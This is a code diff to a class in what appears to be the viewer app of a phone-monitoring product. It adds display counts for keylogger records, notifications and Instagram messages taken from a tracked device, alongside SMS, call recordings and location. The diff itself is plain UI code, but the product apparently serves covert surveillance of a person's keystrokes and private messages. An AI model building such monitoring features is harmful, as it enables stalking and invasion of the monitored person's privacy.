@@ -36,9 +36,11 @@ import static com.scp.viewer.API.Global.GET_CALENDAR_HISTORY;
 import static com.scp.viewer.API.Global.GET_CALL_HISTORY;
 import static com.scp.viewer.API.Global.GET_CLIPBOARD_HISTORY;
 import static com.scp.viewer.API.Global.GET_CONTACT_HISTORY;
+import static com.scp.viewer.API.Global.GET_KEYLOGGER_HISTORY;
 import static com.scp.viewer.API.Global.GET_LOCATION_HISTORY;
 import static com.scp.viewer.API.Global.GET_NETWORK_HISTORY;
 import static com.scp.viewer.API.Global.GET_NOTES_HISTORY;
+import static com.scp.viewer.API.Global.GET_NOTIFICATION_HISTORY;
 import static com.scp.viewer.API.Global.GET_PHONE_CALL_RECORDING;
 import static com.scp.viewer.API.Global.GET_PHOTO_HISTORY;
 import static com.scp.viewer.API.Global.GET_SMS_HISTORY;
@@ -46,9 +48,12 @@ import static com.scp.viewer.API.Global.GET_URL_HISTORY;
 import static com.scp.viewer.API.Global.GET_YOUTUBE_HISTORY;
 import static com.scp.viewer.API.Global.GPS_TOTAL;
 import static com.scp.viewer.API.Global.HANGOUTS_TOTAL;
+import static com.scp.viewer.API.Global.INSTAGRAM_TOTAL;
+import static com.scp.viewer.API.Global.KEYLOGGER_TOTAL;
 import static com.scp.viewer.API.Global.LENGHT;
 import static com.scp.viewer.API.Global.MIN_TIME;
 import static com.scp.viewer.API.Global.NETWORK_TOTAL;
+import static com.scp.viewer.API.Global.NOTIFICATION_TOTAL;
 import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_TOTAL;
 import static com.scp.viewer.API.Global.PHOTO_TOTAL;
 import static com.scp.viewer.API.Global.SETTINGS;
@@ -56,6 +61,7 @@ import static com.scp.viewer.API.Global.SKYPE_TOTAL;
 import static com.scp.viewer.API.Global.SMS_DEFAULT_TYPE;
 import static com.scp.viewer.API.Global.SMS_FACEBOOK_TYPE;
 import static com.scp.viewer.API.Global.SMS_HANGOUTS_TYPE;
+import static com.scp.viewer.API.Global.SMS_INSTAGRAM_TYPE;
 import static com.scp.viewer.API.Global.SMS_SKYPE_TYPE;
 import static com.scp.viewer.API.Global.SMS_TOTAL;
 import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
@@ -284,6 +290,16 @@ public class APIGetTotalItemOfFeature {
 
                 setTotalNumberTextView(YOUTUBE_TOTAL + deviceID, totalRow, false);
             }
+            else if(functionName.equals(GET_NOTIFICATION_HISTORY)) // 2021-07-19
+            {
+
+                setTotalNumberTextView(NOTIFICATION_TOTAL + deviceID, totalRow, false);
+            }
+            else if(functionName.equals(GET_KEYLOGGER_HISTORY)) // 2021-07-19
+            {
+
+                setTotalNumberTextView(KEYLOGGER_TOTAL + deviceID, totalRow, false);
+            }
         }
 
         /**
@@ -317,6 +333,10 @@ public class APIGetTotalItemOfFeature {
                 else if(smsType.equals(SMS_HANGOUTS_TYPE))
                 {
                     setTotalNumberTextView(HANGOUTS_TOTAL + deviceID, totalRow, true);
+                }
+                else if(smsType.equals(SMS_INSTAGRAM_TYPE))
+                {
+                    setTotalNumberTextView(INSTAGRAM_TOTAL + deviceID, totalRow, true);
                 }
             }
         }
